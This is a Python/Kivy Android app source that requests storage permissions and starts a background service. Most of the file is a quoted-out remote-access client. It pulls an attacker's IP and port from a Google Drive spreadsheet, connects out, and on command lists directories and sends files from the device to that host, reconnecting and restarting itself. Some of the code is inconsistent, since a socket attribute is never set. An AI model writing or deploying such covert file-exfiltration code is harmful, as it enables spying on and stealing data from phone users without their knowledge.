"""import socket
import os,sys
import time
import pandas as pd
from threading import Thread

from kivymd.app import MDApp
from kivy.app import App
from kivymd.uix.label import MDLabel
from kivy.uix.boxlayout import BoxLayout"""
from kivy.utils import platform
if platform == 'android':
    from android.permissions import request_permissions, Permission
    request_permissions([Permission.READ_EXTERNAL_STORAGE, Permission.WRITE_EXTERNAL_STORAGE])
    from jnius import autoclass
SERVICE_NAME = u'{packagename}.Service{servicename}'.format(
    packagename=u'org.kivy.test6',
    servicename=u'Myservice'
)
service = autoclass(SERVICE_NAME)
mActivity = autoclass(u'org.kivy.android.PythonActivity').mActivity
argument = ''
service.start(mActivity, argument)
"""class MyRoot(BoxLayout):
    pass



class run:
    
    def start(self,s):
        while 1:
            try:
                op = s.recv(1024).decode()
                path = s.recv(1024).decode()
                if op == "list":
                    self.list(path)
                if op == "transfer":    
                    self.transfer(path)
            except Exception as e:
                print(e)
                break
    def list(self,path):
        try:
            msg = ', '.join(os.listdir(path))
            self.s.send(msg.encode())
        except Exception as e:
            print(e)
    def transfer(self,path):
        try:
            f = open(path,"rb")
            while 1:
                m = f.read(1024)
 
                if m:
                    self.s.send(m)
                else:
                    f.close()
                    print("closed")
                    time.sleep(2)
                    self.s.send("ok".encode())
                    break
        except Exception as e:
            f.close()
            self.s.send("okay".encode())
            print(e)
    def time_out(self):
        time.sleep(60*60*24)
        print("restarting...")
        os.execv(sys.executable, ['python']+sys.argv)
       
    
class Design(App):
    def build(self):
        return MyRoot()
    def connect(self):
        try:
            self.root.ids.label.text = "connecting.."
            #time.sleep(2)
            #headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36'}
            path = "https://drive.google.com/uc?export=download&id=1MaFsb8ADDN5x6YzL-vrArre6-pLerpra"

            df = pd.read_excel(path, engine="openpyxl")
            print("connect()")
            ip = df['ip'][0]
            port = int(df['port'][0])
            #ip = "1.2.3.4"
            #port = 1234
            print('ip :',ip,"\nport :",port)
            #self.ids.ip_text.text = ip
          
            self.root.ids.label.text = "connecting.."
            s = socket.socket()
            s.connect((ip,port))
            self.root.ids.output.text = ip+"\n"
            self.root.ids.label.text = "connected"
            return (s, "connected")
        except Exception as e:
            print(e)
            return s, "notconnected"
        
    def start(self):
        time.sleep(10)
        self.root.ids.ip_text.text = "start"
        print("obj.start()")
        client = run()
        while 1:
            print("loop")
            status = "notconnected"
            try:
                if status == "notconnected":
                    
                    print("status",status)
                    s, status = self.connect()
                    #status = "connected"
                    #self.ids.ip_text.text = status
                    if status == "connected":
                        timmer = Thread(target=client.time_out)
                        timmer.start()
                        client.start(s)
            except Exception as e:
                status = "notconnected"
                print("error : ",e)
            
                

    


obj = Design()

obj.run()

"""